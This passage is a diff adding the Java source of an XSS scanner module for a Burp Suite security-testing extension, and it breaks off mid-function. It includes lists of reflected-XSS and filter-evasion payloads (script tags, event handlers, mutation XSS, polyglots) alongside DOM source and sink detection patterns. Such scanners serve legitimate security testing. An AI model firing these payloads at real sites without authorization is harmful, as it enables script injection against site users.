@@ -1,0 +1,1637 @@
+package com.omnistrike.modules.injection;
+
+import burp.api.montoya.MontoyaApi;
+import burp.api.montoya.http.message.HttpRequestResponse;
+import burp.api.montoya.http.message.params.HttpParameter;
+import burp.api.montoya.http.message.requests.HttpRequest;
+import com.omnistrike.framework.CollaboratorManager;
+import com.omnistrike.framework.DeduplicationStore;
+import com.omnistrike.framework.FindingsStore;
+
+import com.omnistrike.model.*;
+
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.*;
+
+import java.util.concurrent.atomic.AtomicReference;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+/**
+ * MODULE 8: XSS Scanner
+ * Reflection-based XSS detection with context-aware payload selection,
+ * filter evasion techniques, and passive DOM XSS source-to-sink analysis.
+ */
+public class XssScanner implements ScanModule {
+
+    private MontoyaApi api;
+    private ModuleConfig config;
+    private DeduplicationStore dedup;
+    private FindingsStore findingsStore;
+    private CollaboratorManager collaboratorManager;
+
+    // ==================== DOM XSS: SOURCES, SINKS, PATTERNS ====================
+
+    // HIGH risk: directly user-controllable via URL
+    private static final String[] DOM_SOURCES_HIGH = {
+            "location.href", "location.search", "location.hash", "location.pathname",
+            "location.protocol", "location.host", "location.hostname",
+            "document.URL", "document.documentURI", "document.baseURI",
+            "window.location", "self.location",
+            "URLSearchParams", "new URL(", ".searchParams.get(", ".searchParams",
+    };
+
+    // MEDIUM risk: controllable but less direct
+    private static final String[] DOM_SOURCES_MEDIUM = {
+            "document.referrer", "window.name", "document.cookie", "document.domain",
+            "document.title", "history.pushState", "history.replaceState",
+            "localStorage.getItem", "sessionStorage.getItem",
+            "localStorage[", "sessionStorage[",
+            "postMessage", "event.data", "e.data", "evt.data", "msg.data",
+            ".responseText", ".responseJSON", ".responseXML",
+            "response.text()", "response.json()",
+            "XMLHttpRequest", ".readyState",
+    };
+
+    // LOW risk: indirect or requires specific conditions
+    private static final String[] DOM_SOURCES_LOW = {
+            ".value", ".textContent", ".innerText",
+            ".getAttribute(", ".dataset",
+            "decodeURIComponent(", "decodeURI(",
+            "atob(", "JSON.parse(",
+            "$.param", "$.getJSON",
+    };
+
+    // All sources combined for quick lookup
+    private static final String[] DOM_SOURCES_ALL;
+    static {
+        List<String> all = new ArrayList<>();
+        Collections.addAll(all, DOM_SOURCES_HIGH);
+        Collections.addAll(all, DOM_SOURCES_MEDIUM);
+        Collections.addAll(all, DOM_SOURCES_LOW);
+        DOM_SOURCES_ALL = all.toArray(new String[0]);
+    }
+
+    // CRITICAL sinks: direct code execution
+    private static final String[] DOM_SINKS_EXEC = {
+            "eval(", "eval (", "Function(", "Function (",
+            "setTimeout(", "setInterval(", "setImmediate(",
+            "execScript(", "msSetImmediate(",
+            "new Function(", "new Function (",
+    };
+
+    // HIGH sinks: HTML injection
+    private static final String[] DOM_SINKS_HTML = {
+            ".innerHTML", ".outerHTML",
+            "document.write(", "document.write (",
+            "document.writeln(", "document.writeln (",
+            "insertAdjacentHTML(", "insertAdjacentHTML (",
+            ".createContextualFragment(",
+    };
+
+    // HIGH sinks: URL-based (can lead to javascript: execution)
+    private static final String[] DOM_SINKS_URL = {
+            "location.href=", "location.assign(", "location.replace(",
+            "window.open(", "window.open (",
+            ".src=", ".href=", ".action=",
+            ".setAttribute(\"href\"", ".setAttribute('href'",
+            ".setAttribute(\"src\"", ".setAttribute('src'",
+            ".setAttribute(\"action\"", ".setAttribute('action'",
+            ".setAttribute(\"data\"", ".setAttribute('data'",
+            "window.location=", "self.location=",
+            "location=",
+    };
+
+    // MEDIUM sinks: jQuery HTML injection
+    private static final String[] DOM_SINKS_JQUERY = {
+            ".html(", ".append(", ".prepend(",
+            ".after(", ".before(", ".replaceWith(",
+            ".wrapAll(", ".wrapInner(", ".wrap(",
+            "$.globalEval(", "$.parseHTML(",
+            "jQuery.globalEval(", "jQuery.parseHTML(",
+            "$(", "jQuery(",   // jQuery selector with HTML string
+    };
+
+    // MEDIUM sinks: Framework-specific
+    private static final String[] DOM_SINKS_FRAMEWORK = {
+            "dangerouslySetInnerHTML",                           // React
+            "v-html",                                            // Vue
+            "bypassSecurityTrustHtml", "bypassSecurityTrustScript",
+            "bypassSecurityTrustUrl", "bypassSecurityTrustResourceUrl", // Angular
+            "ng-bind-html", "ng-bind-html-unsafe",              // AngularJS
+            "$sce.trustAsHtml(", "$sce.trustAs(",                // AngularJS
+            "Handlebars.SafeString(", "Ember.String.htmlSafe(",  // Handlebars/Ember
+            "Mustache.render(", "_.template(",                   // Mustache/Lodash
+            "Lit.unsafeHTML(", "unsafeHTML(",                    // Lit
+    };
+
+    // All sinks combined
+    private static final String[] DOM_SINKS_ALL;
+    static {
+        List<String> all = new ArrayList<>();
+        Collections.addAll(all, DOM_SINKS_EXEC);
+        Collections.addAll(all, DOM_SINKS_HTML);
+        Collections.addAll(all, DOM_SINKS_URL);
+        Collections.addAll(all, DOM_SINKS_JQUERY);
+        Collections.addAll(all, DOM_SINKS_FRAMEWORK);
+        DOM_SINKS_ALL = all.toArray(new String[0]);
+    }
+
+    // Known sanitizers — if present near a sink, reduces confidence
+    private static final String[] SANITIZERS = {
+            "DOMPurify.sanitize(", "DOMPurify.sanitize (",
+            "sanitizeHtml(", "sanitize(",
+            "escapeHtml(", "escapeHTML(",
+            "htmlEscape(", "xssFilters.",
+            "encodeURIComponent(", "encodeURI(",
+            "textContent=", "innerText=",
+            "createTextNode(", "he.encode(",
+            "validator.escape(", "_.escape(",
+            "$sce.trustAs", "filterXSS(",
+    };
+
+    // Regex patterns for variable assignment tracking
+    private static final Pattern VAR_ASSIGN_PATTERN = Pattern.compile(
+            "(?:var|let|const)\\s+(\\w+)\\s*=\\s*([^;]{1,200});", Pattern.MULTILINE);
+    private static final Pattern ASSIGN_PATTERN = Pattern.compile(
+            "(\\w+)\\s*=\\s*([^;=]{1,200});", Pattern.MULTILINE);
+
+    // Regex for jQuery selector with user input
+    private static final Pattern JQUERY_SELECTOR_SOURCE = Pattern.compile(
+            "\\$\\(\\s*(?:location\\.(?:hash|search|href)|document\\.URL|window\\.name|document\\.referrer)",
+            Pattern.CASE_INSENSITIVE);
+
+    // Regex for postMessage handler without origin check
+    private static final Pattern POSTMESSAGE_HANDLER = Pattern.compile(
+            "addEventListener\\s*\\(\\s*['\"]message['\"]\\s*,\\s*function\\s*\\(([^)]+)\\)",
+            Pattern.CASE_INSENSITIVE);
+
+    // Regex for event handler attributes with sources
+    private static final Pattern EVENT_HANDLER_ATTR = Pattern.compile(
+            "\\bon\\w+\\s*=\\s*[\"']([^\"']{1,500})[\"']", Pattern.CASE_INSENSITIVE);
+
+    // Regex for javascript: URL scheme
+    private static final Pattern JS_URL_SCHEME = Pattern.compile(
+            "(?:href|src|action|data|formaction)\\s*=\\s*[\"']\\s*javascript\\s*:([^\"']{1,500})[\"']",
+            Pattern.CASE_INSENSITIVE);
+
+    // Regex to extract inline <script> blocks
+    private static final Pattern SCRIPT_BLOCK_PATTERN = Pattern.compile(
+            "<script[^>]*>(.*?)</script>", Pattern.DOTALL | Pattern.CASE_INSENSITIVE);
+
+    // DOM XSS canary for active testing
+    private static final String DOM_CANARY = "dOmXsS9c4n4ry";
+
+    // Canary for reflection detection
+    private static final String CANARY = "xSsX7c4n4ry";
+
+    // Context-specific payloads
+    private static final Map<String, String[][]> CONTEXT_PAYLOADS = new LinkedHashMap<>();
+
+    static {
+        CONTEXT_PAYLOADS.put("HTML_BODY", new String[][]{
+                {"<script>alert(1)</script>", "<script>alert(1)</script>", "Basic script tag"},
+                {"<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>", "img onerror"},
+                {"<svg onload=alert(1)>", "<svg onload=alert(1)>", "svg onload"},
+                {"<body onload=alert(1)>", "<body onload=alert(1)>", "body onload"},
+                {"<details open ontoggle=alert(1)>", "<details open ontoggle=alert(1)>", "details ontoggle"},
+                {"<marquee onstart=alert(1)>", "<marquee onstart=alert(1)>", "marquee onstart"},
+                {"<video><source onerror=alert(1)>", "<video><source onerror=alert(1)>", "video source onerror"},
+                {"<input onfocus=alert(1) autofocus>", "<input onfocus=alert(1) autofocus>", "input autofocus"},
+                {"<select autofocus onfocus=alert(1)>", "<select autofocus onfocus=alert(1)>", "select autofocus"},
+                {"<textarea autofocus onfocus=alert(1)>", "<textarea autofocus onfocus=alert(1)>", "textarea autofocus"},
+                {"<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img/src=1 onerror=alert(1)>\">", "", "Math/SVG mutation"},
+        });
+        CONTEXT_PAYLOADS.put("HTML_ATTRIBUTE", new String[][]{
+                {"\" onmouseover=\"alert(1)", "onmouseover", "Attribute breakout - double quote"},
+                {"' onmouseover='alert(1)", "onmouseover", "Attribute breakout - single quote"},
+                {"\" onfocus=\"alert(1)\" autofocus=\"", "onfocus", "Attribute breakout - autofocus"},
+                {"' onfocus='alert(1)' autofocus='", "onfocus", "Attribute breakout - single quote autofocus"},
+                {"\"><script>alert(1)</script>", "<script>", "Tag breakout - double quote"},
+                {"'><script>alert(1)</script>", "<script>", "Tag breakout - single quote"},
+                {"\"><img src=x onerror=alert(1)>", "<img", "Img injection - double quote"},
+                {"javascript:alert(1)", "javascript:", "Javascript scheme (for href/src)"},
+                {"\"><svg/onload=alert(1)>", "<svg", "SVG injection from attribute breakout"},
+                {"\" accesskey=\"x\" onclick=\"alert(1)", "onclick", "Accesskey onclick trigger"},
+                {"\" style=\"animation-name:x\" onanimationend=\"alert(1)", "onanimationend", "CSS animation event"},
+        });
+        CONTEXT_PAYLOADS.put("JS_STRING", new String[][]{
+                {"</script><script>alert(1)</script>", "<script>alert(1)</script>", "Script tag breakout"},
+                {"'-alert(1)-'", "alert(1)", "JS string breakout - single quote"},
+                {"\"-alert(1)-\"", "alert(1)", "JS string breakout - double quote"},
+                {"\\'-alert(1)//", "alert(1)", "JS escaped quote breakout"},
+                {"';alert(1)//", "alert(1)", "JS semicolon breakout - single"},
+                {"\";alert(1)//", "alert(1)", "JS semicolon breakout - double"},
+        });
+        CONTEXT_PAYLOADS.put("JS_TEMPLATE_LITERAL", new String[][]{
+                {"${alert(1)}", "alert(1)", "Template literal injection"},
+                {"`-alert(1)-`", "alert(1)", "Backtick breakout"},
+                {"${7*7}", "49", "Template literal evaluation"},
+        });
+        CONTEXT_PAYLOADS.put("HTML_COMMENT", new String[][]{
+                {"--><script>alert(1)</script><!--", "<script>alert(1)</script>", "Comment breakout"},
+                {"--!><script>alert(1)</script>", "<script>alert(1)</script>", "Comment breakout (IE)"},
+        });
+        CONTEXT_PAYLOADS.put("CSS_CONTEXT", new String[][]{
+                {"</style><script>alert(1)</script>", "<script>alert(1)</script>", "Style tag breakout"},
+                {"expression(alert(1))", "expression(alert(1))", "CSS expression (IE)"},
+        });
+    }
+
+    // Filter evasion payloads
+    private static final String[][] EVASION_PAYLOADS = {
+            {"<ScRiPt>alert(1)</ScRiPt>", "<ScRiPt>alert(1)</ScRiPt>", "Case mixing"},
+            {"<scr\0ipt>alert(1)</scr\0ipt>", "alert(1)", "Null byte injection"},
+            {"<img src=x onerror=alert(1)>", "onerror=alert", "Event handler"},
+            {"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "onerror=", "HTML entity encoding"},
+            {"<img/src=x onerror=alert(1)>", "onerror=alert", "Slash instead of space"},
+            {"<svg/onload=alert(1)>", "onload=alert", "SVG slash space bypass"},
+            {"<iMg sRc=x oNeRrOr=alert(1)>", "oNeRrOr=alert", "Random case"},
+            {"%3Cscript%3Ealert(1)%3C/script%3E", "", "URL encoded (double decode check)"},
+            {"<scr<script>ipt>alert(1)</scr</script>ipt>", "alert(1)", "Nested tags"},
+            {"<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">x</a>", "javascript:", "Entity encoded scheme"},
+            {"<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "onbegin=alert", "SVG animate"},
+            {"<object data=javascript:alert(1)>", "javascript:", "Object data scheme"},
+            {"<isindex type=image src=1 onerror=alert(1)>", "onerror=alert", "Isindex tag"},
+            {"<math><mtext><table><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">", "onerror=alert", "Math/SVG mutation XSS"},
+            {"<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}", "onerror=alert", "SVG style mutation"},
+            {"<details open ontoggle=alert(1)>", "ontoggle=alert", "Details ontoggle"},
+            {"<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>", "javascript:alert", "SVG animate href"},
+            {"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "alert(1)", "Unicode escape sequences"},
+            {"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "alert()", "XSS polyglot"},
+            {"<form action=javascript:alert(1)><input type=submit>", "javascript:alert", "Form action hijack"},
+            {"<input type=hidden onfocus=alert(1) autofocus>", "onfocus=alert", "Hidden input autofocus"},
+            {"<body background=javascript:alert(1)>", "javascript:", "Body background scheme (legacy)"},
+            {"<link rel=import href=data:text/html,<script>alert(1)</script>>", "<script>alert", "HTML import data scheme"},
+    };
+
+    @Override
+    public String getId() { return "xss-scanner"; }
+
+    @Override
+    public String getName() { return "XSS Scanner"; }
+
+    @Override
+    public String getDescription() {
+        return "Reflected XSS detection with context analysis, filter evasion, and passive DOM XSS scanning.";
+    }
+
+    @Override
+    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
+
+    @Override
+    public boolean isPassive() { return false; }
+
+    @Override
+    public void initialize(MontoyaApi api, ModuleConfig config) {
+        this.api = api;
+        this.config = config;
+    }
+
+    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore, CollaboratorManager collaboratorManager) {
+        this.dedup = dedup;
+        this.findingsStore = findingsStore;
+        this.collaboratorManager = collaboratorManager;
+    }
+
+    @Override
+    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
+        List<Finding> findings = new ArrayList<>();
+
+        // Passive: DOM XSS analysis on JavaScript responses
+        if (config.getBool("xss.domAnalysis.enabled", true)) {
+            findings.addAll(analyzeForDomXss(requestResponse));
+        }
+
+        // Active: Reflected XSS testing
+        HttpRequest request = requestResponse.request();
+        String urlPath = extractPath(request.url());
+        List<XssTarget> targets = extractTargets(request);
+
+        api.logging().logToOutput("[XSS] processHttpFlow called: " + request.url()
+                + " | params found: " + targets.size());
+
+        for (XssTarget target : targets) {
+            if (!dedup.markIfNew("xss-scanner", urlPath, target.name)) {
+                api.logging().logToOutput("[XSS] Skipping '" + target.name + "' — already tested");
+                continue;
+            }
+
+            try {
+                testReflectedXss(requestResponse, target);
+                // Active DOM XSS: check if parameter reflects into script blocks near sinks
+                if (config.getBool("xss.domAnalysis.enabled", true)) {
+                    testActiveDomXss(requestResponse, target);
+                }
+            } catch (Exception e) {
+                api.logging().logToError("XSS test error on " + target.name + ": " + e.getMessage());
+            }
+        }
+
+        return findings;
+    }
+
+    // ==================== PASSIVE: DOM XSS ANALYSIS ====================
+
+    private List<Finding> analyzeForDomXss(HttpRequestResponse requestResponse) {
+        List<Finding> findings = new ArrayList<>();
+        if (requestResponse.response() == null) return findings;
+
+        String contentType = "";
+        for (var h : requestResponse.response().headers()) {
+            if (h.name().equalsIgnoreCase("Content-Type")) { contentType = h.value().toLowerCase(); break; }
+        }
+
+        if (!contentType.contains("javascript") && !contentType.contains("text/html")
+                && !contentType.contains("application/json")) return findings;
+
+        String body;
+        try {
+            body = requestResponse.response().bodyToString();
+        } catch (Exception e) {
+            return findings;
+        }
+        if (body == null || body.length() < 20) return findings;
+
+        String url = requestResponse.request().url();
+
+        // Extract script blocks from HTML, or treat entire body as JS
+        List<String> scriptBlocks = extractScriptBlocks(body, contentType);
+
+        Set<String> reported = new HashSet<>(); // Dedup: "source|sink"
+
+        for (String script : scriptBlocks) {
+            // 1. Direct source-to-sink proximity analysis
+            analyzeDirectFlows(script, url, requestResponse, findings, reported);
+
+            // 2. Variable flow tracking: var x = source; ... sink(x)
+            analyzeVariableFlows(script, url, requestResponse, findings, reported);
+
+            // 3. jQuery-specific DOM XSS patterns
+            analyzeJQueryPatterns(script, url, requestResponse, findings, reported);
+
+            // 4. postMessage handlers without origin validation
+            analyzePostMessageHandlers(script, url, requestResponse, findings, reported);
+
+            // 5. Dangerous eval-like patterns with sources
+            analyzeEvalPatterns(script, url, requestResponse, findings, reported);
+
+            // 6. Dynamic script/iframe loading from user input
+            analyzeDynamicLoading(script, url, requestResponse, findings, reported);
+        }
+
+        // 7. HTML-level analysis (event handlers, javascript: URLs, framework attrs)
+        analyzeHtmlEventHandlers(body, url, requestResponse, findings, reported);
+        analyzeJavaScriptUrls(body, url, requestResponse, findings, reported);
+        analyzeFrameworkAttributes(body, url, requestResponse, findings, reported);
+
+        return findings;
+    }
+
+    /**
+     * Extracts inline <script> block contents from HTML, or returns entire body for JS files.
+     */
+    private List<String> extractScriptBlocks(String body, String contentType) {
+        List<String> blocks = new ArrayList<>();
+
+        if (contentType.contains("javascript") || contentType.contains("application/json")) {
+            blocks.add(body);
+            return blocks;
+        }
+
+        // Extract inline script blocks
+        Matcher m = SCRIPT_BLOCK_PATTERN.matcher(body);
+        while (m.find()) {
+            String content = m.group(1).trim();
+            if (!content.isEmpty() && content.length() > 10) {
+                blocks.add(content);
+            }
+        }
+
+        // If no script blocks found but body has JS-like content, analyze it
+        if (blocks.isEmpty() && (body.contains("function") || body.contains("var ")
+                || body.contains("document.") || body.contains("window."))) {
+            blocks.add(body);
+        }
+
+        return blocks;
+    }
+
+    /**
+     * Phase 1: Direct source-to-sink proximity within the same script block.
+     * Searches all occurrences (not just the first) and uses configurable proximity.
+     */
+    private void analyzeDirectFlows(String script, String url, HttpRequestResponse reqResp,
+                                     List<Finding> findings, Set<String> reported) {
+        for (String source : DOM_SOURCES_ALL) {
+            int srcIdx = -1;
+            while ((srcIdx = script.indexOf(source, srcIdx + 1)) >= 0) {
+                for (String sink : DOM_SINKS_ALL) {
+                    String key = source + "|" + sink;
+                    if (reported.contains(key)) continue;
+
+                    // Search for sink within 800 chars of source (either direction)
+                    int searchStart = Math.max(0, srcIdx - 800);
+                    int searchEnd = Math.min(script.length(), srcIdx + source.length() + 800);
+                    String region = script.substring(searchStart, searchEnd);
+
+                    int sinkOffset = region.indexOf(sink);
+                    if (sinkOffset >= 0) {
+                        int sinkAbsIdx = searchStart + sinkOffset;
+                        if (sinkAbsIdx == srcIdx) continue; // Same position
+
+                        // Check if sanitizer is present between source and sink
+                        boolean sanitized = isSanitized(region);
+
+                        String context = extractContext(script, Math.min(srcIdx, sinkAbsIdx),
+                                Math.max(srcIdx + source.length(), sinkAbsIdx + sink.length()));
+
+                        Severity sev = getSinkSeverity(sink);
+                        Confidence conf = sanitized ? Confidence.TENTATIVE : getSourceConfidence(source);
+
+                        if (sanitized) {
+                            sev = sev == Severity.CRITICAL ? Severity.LOW : Severity.INFO;
+                        }
+
+                        findings.add(Finding.builder("xss-scanner",
+                                        "DOM XSS: " + source + " → " + sink
+                                                + (sanitized ? " (sanitizer detected)" : ""),
+                                        sev, conf)
+                                .url(url)
+                                .evidence("Source: " + source + " | Sink: " + sink
+                                        + (sanitized ? " | Sanitizer present" : "")
+                                        + "\nContext:\n" + context)
+                                .description("User-controlled input from '" + source
+                                        + "' flows into dangerous sink '" + sink + "'."
+                                        + (sanitized ? " A sanitizer was detected nearby, reducing risk."
+                                        : " No sanitization detected — likely exploitable."))
+                                .remediation("Sanitize user input before passing to " + sink
+                                        + ". Use DOMPurify.sanitize() for HTML sinks, "
+                                        + "encodeURIComponent() for URL sinks, or textContent for safe text insertion.")
+                                .requestResponse(reqResp)
+                                .build());
+
+                        reported.add(key);
+                        break; // One finding per source-sink pair
+                    }
+                }
+            }
+        }
+    }
+
+    /**
+     * Phase 2: Variable flow tracking.
+     * Detects patterns like: var x = location.hash; ... element.innerHTML = x;
+     * Supports 2-level chaining: var a = source; var b = a; sink(b);
+     */
+    private void analyzeVariableFlows(String script, String url, HttpRequestResponse reqResp,
+                                       List<Finding> findings, Set<String> reported) {
+        // Track variable assignments: var/let/const name = expression;
+        Map<String, String> taintedVars = new LinkedHashMap<>(); // varName → source
+
+        // Pass 1: Find variables assigned from DOM sources
+        Matcher varMatcher = VAR_ASSIGN_PATTERN.matcher(script);
+        while (varMatcher.find()) {
+            String varName = varMatcher.group(1);
+            String expression = varMatcher.group(2).trim();
+
+            for (String source : DOM_SOURCES_ALL) {
+                if (expression.contains(source)) {
+                    taintedVars.put(varName, source);
+                    break;
+                }
+            }
+        }
+
+        // Also check plain assignments (without var/let/const)
+        Matcher assignMatcher = ASSIGN_PATTERN.matcher(script);
+        while (assignMatcher.find()) {
+            String varName = assignMatcher.group(1);
+            String expression = assignMatcher.group(2).trim();
+
+            // Skip if it's a sink assignment (we'll check those below)
+            if (varName.contains(".innerHTML") || varName.contains(".outerHTML")) continue;
+
+            for (String source : DOM_SOURCES_ALL) {
+                if (expression.contains(source)) {
+                    taintedVars.put(varName, source);
+                    break;
+                }
+            }
+        }
+
+        // Pass 2: Chain propagation — var b = a (where a is tainted)
+        for (int round = 0; round < 3; round++) { // Up to 3 levels of chaining
+            Map<String, String> newTainted = new LinkedHashMap<>();
+            Matcher chainMatcher = VAR_ASSIGN_PATTERN.matcher(script);
+            while (chainMatcher.find()) {
+                String varName = chainMatcher.group(1);
+                String expression = chainMatcher.group(2).trim();
+                if (taintedVars.containsKey(varName)) continue;
+
+                for (String tainted : taintedVars.keySet()) {
+                    // Check if the expression uses a tainted variable
+                    if (expression.matches(".*\\b" + Pattern.quote(tainted) + "\\b.*")) {
+                        newTainted.put(varName, taintedVars.get(tainted) + " → " + tainted);
+                        break;
+                    }
+                }
+            }
+            if (newTainted.isEmpty()) break;
+            taintedVars.putAll(newTainted);
+        }
+
+        if (taintedVars.isEmpty()) return;
+
+        // Pass 3: Check if tainted variables appear in sinks
+        for (Map.Entry<String, String> entry : taintedVars.entrySet()) {
+            String varName = entry.getKey();
+            String sourceChain = entry.getValue();
+
+            for (String sink : DOM_SINKS_ALL) {
+                String key = "var:" + varName + "|" + sink;
+                if (reported.contains(key)) continue;
+
+                // Look for sink usage with the tainted variable
+                // Patterns: sink(varName), .innerHTML = varName, $(varName)
+                String[] usagePatterns = {
+                        sink + varName,                     // eval(varName
+                        sink + " " + varName,               // eval( varName
+                        sink.replace("(", "\\(") + "\\s*" + Pattern.quote(varName),
+                        "\\." + sink.replace(".", "").replace("(", "")
+                                + "\\s*\\(\\s*" + Pattern.quote(varName),   // .html(varName)
+                        "\\." + sink.replace(".", "").replace("=", "")
+                                + "\\s*=\\s*" + Pattern.quote(varName),     // .innerHTML = varName
+                };
+
+                boolean found = false;
+                for (String pattern : usagePatterns) {
+                    try {
+                        if (script.contains(sink) && script.matches("(?s).*" + pattern + ".*")) {
+                            found = true;
+                            break;
+                        }
+                    } catch (Exception ignored) {
+                        // Regex might fail on complex patterns
+                        if (script.contains(sink) && script.contains(varName)) {
+                            // Fallback: check if both sink and variable are in same function/block
+                            found = areSameBlock(script, sink, varName);
+                        }
+                    }
+                }
+
+                if (!found) {
+                    // Simple contains check as fallback
+                    for (String sinkBase : DOM_SINKS_ALL) {
+                        if (script.contains(sinkBase) && script.contains(varName)) {
+                            // Check proximity
+                            int sinkIdx = script.indexOf(sinkBase);
+                            int varIdx = script.indexOf(varName, sinkIdx - 200);
+                            if (varIdx >= 0 && Math.abs(varIdx - sinkIdx) < 200) {
+                                found = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if (found) {
+                    boolean sanitized = false;
+                    for (String san : SANITIZERS) {
+                        if (script.contains(san) && script.contains(varName)) {
+                            // Check if sanitizer is applied to this variable
+                            int sanIdx = script.indexOf(san);
+                            int varIdx = script.indexOf(varName, sanIdx);
+                            if (varIdx >= 0 && varIdx - sanIdx < 100) {
+                                sanitized = true;
+                                break;
+                            }
+                        }
+                    }
+
+                    Severity sev = sanitized ? Severity.LOW : Severity.HIGH;
+                    Confidence conf = sanitized ? Confidence.TENTATIVE : Confidence.TENTATIVE;
+
+                    findings.add(Finding.builder("xss-scanner",
+                                    "DOM XSS via Variable Flow: " + sourceChain + " → " + varName + " → " + sink
+                                            + (sanitized ? " (sanitizer detected)" : ""),
+                                    sev, conf)
+                            .url(url)
+                            .evidence("Source chain: " + sourceChain
+                                    + "\nTainted variable: " + varName
+                                    + "\nSink: " + sink
+                                    + (sanitized ? "\nSanitizer detected nearby" : ""))
+                            .description("Data flows from user-controlled source '" + sourceChain
+                                    + "' through variable '" + varName + "' into dangerous sink '" + sink
+                                    + "'." + (sanitized ? " A sanitizer was detected, but verify it's applied correctly."
+                                    : " No sanitization detected in the flow."))
+                            .remediation("Sanitize the variable '" + varName + "' before passing to " + sink + ".")
+                            .requestResponse(reqResp)
+                            .build());
+
+                    reported.add(key);
+                    break;
+                }
+            }
+        }
+    }
+
+    /**
+     * Phase 3: jQuery-specific DOM XSS patterns.
+     * Detects $(location.hash), $('selector').html(userInput), etc.
+     */
+    private void analyzeJQueryPatterns(String script, String url, HttpRequestResponse reqResp,
+                                        List<Finding> findings, Set<String> reported) {
+        // Pattern 1: jQuery selector with DOM source — $(location.hash)
+        Matcher jqMatcher = JQUERY_SELECTOR_SOURCE.matcher(script);
+        while (jqMatcher.find()) {
+            String key = "jquery-selector|" + jqMatcher.group();
+            if (reported.contains(key)) continue;
+
+            String context = extractContext(script, jqMatcher.start(), jqMatcher.end());
+
+            findings.add(Finding.builder("xss-scanner",
+                            "DOM XSS: jQuery Selector with User Input",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("Pattern: " + jqMatcher.group() + "\nContext:\n" + context)
+                    .description("jQuery is called with a DOM source as selector. If the source contains "
+                            + "HTML (e.g., location.hash = '#<img src=x onerror=alert(1)>'), jQuery will "
+                            + "create and inject the HTML element, leading to XSS.")
+                    .remediation("Never pass user-controlled input directly to $(). Use $(document).find() "
+                            + "with a sanitized selector, or validate that the input is a valid CSS selector.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+
+        // Pattern 2: String concatenation in jQuery selector with hash/search
+        Pattern jqConcat = Pattern.compile(
+                "\\$\\(\\s*['\"]\\s*[^'\"]*['\"]\\s*\\+\\s*(?:location\\.|document\\.URL|window\\.name)",
+                Pattern.CASE_INSENSITIVE);
+        Matcher concatMatcher = jqConcat.matcher(script);
+        while (concatMatcher.find()) {
+            String key = "jquery-concat|" + concatMatcher.start();
+            if (reported.contains(key)) continue;
+
+            String context = extractContext(script, concatMatcher.start(), concatMatcher.end());
+
+            findings.add(Finding.builder("xss-scanner",
+                            "DOM XSS: jQuery Selector with Concatenated User Input",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("Pattern: " + concatMatcher.group() + "\nContext:\n" + context)
+                    .description("jQuery selector is built by concatenating user-controllable input. "
+                            + "An attacker can break out of the selector context and inject HTML.")
+                    .remediation("Avoid string concatenation in jQuery selectors. Use .find() or validate input.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+
+        // Pattern 3: .html() / .append() called with DOM source variable
+        Pattern jqHtmlSource = Pattern.compile(
+                "\\.(html|append|prepend|after|before|replaceWith|wrapAll|wrapInner)\\s*\\(\\s*"
+                        + "(?:location\\.|document\\.URL|document\\.referrer|window\\.name|event\\.data|e\\.data)",
+                Pattern.CASE_INSENSITIVE);
+        Matcher htmlMatcher = jqHtmlSource.matcher(script);
+        while (htmlMatcher.find()) {
+            String key = "jquery-html|" + htmlMatcher.group();
+            if (reported.contains(key)) continue;
+
+            String context = extractContext(script, htmlMatcher.start(), htmlMatcher.end());
+
+            findings.add(Finding.builder("xss-scanner",
+                            "DOM XSS: jQuery ." + htmlMatcher.group(1) + "() with User Input",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("Pattern: " + htmlMatcher.group() + "\nContext:\n" + context)
+                    .description("jQuery's ." + htmlMatcher.group(1) + "() is called directly with "
+                            + "user-controllable input, allowing HTML injection and XSS.")
+                    .remediation("Use .text() instead of .html() for text content. Sanitize with "
+                            + "DOMPurify.sanitize() before passing to .html().")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+    }
+
+    /**
+     * Phase 4: postMessage handler analysis.
+     * Detects event listeners for 'message' that use event.data in sinks without origin checks.
+     */
+    private void analyzePostMessageHandlers(String script, String url, HttpRequestResponse reqResp,
+                                             List<Finding> findings, Set<String> reported) {
+        Matcher pmMatcher = POSTMESSAGE_HANDLER.matcher(script);
+        while (pmMatcher.find()) {
+            String eventParam = pmMatcher.group(1).trim(); // e.g., "e" or "event" or "msg"
+            int handlerStart = pmMatcher.start();
+
+            // Find the handler body (look for matching braces)
+            int braceStart = script.indexOf('{', pmMatcher.end());
+            if (braceStart < 0) continue;
+            String handlerBody = extractFunctionBody(script, braceStart);
+            if (handlerBody.isEmpty()) continue;
+
+            // Check for origin validation
+            boolean hasOriginCheck = handlerBody.contains(".origin")
+                    || handlerBody.contains("event.origin")
+                    || handlerBody.contains(eventParam + ".origin");
+
+            // Check if event.data flows into sinks
+            String dataAccess = eventParam + ".data";
+            boolean dataUsedInSink = false;
+            String sinkFound = "";
+
+            for (String sink : DOM_SINKS_ALL) {
+                if (handlerBody.contains(sink) && handlerBody.contains(dataAccess)) {
+                    dataUsedInSink = true;
+                    sinkFound = sink;
+                    break;
+                }
+                // Also check if .data is assigned to a variable that reaches a sink
+                if (handlerBody.contains(dataAccess)) {
